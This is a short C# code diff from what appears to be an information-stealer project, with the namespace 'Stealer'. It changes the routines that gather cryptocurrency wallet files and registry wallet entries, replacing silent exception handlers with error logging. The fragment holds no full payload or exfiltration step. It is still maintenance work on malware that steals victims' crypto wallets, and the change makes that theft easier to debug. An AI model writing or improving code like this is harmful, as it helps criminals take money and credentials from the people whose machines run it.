@@ -45,7 +45,7 @@ namespace Stealer
                 if (Counter.Wallets == 0)
                     Filemanager.RecursiveDelete(sSaveDir);
 
-            } catch { }
+            } catch (System.Exception ex) { Logging.Log("Wallets >> Failed collect wallets\n" + ex); }
         }
 
         // Copy wallet files to directory
@@ -79,7 +79,7 @@ namespace Stealer
                     }
                 }
             }
-            catch { }
+            catch (System.Exception ex) { Logging.Log("Wallets >> Failed collect wallet from registry\n" + ex); }
         }
 
 
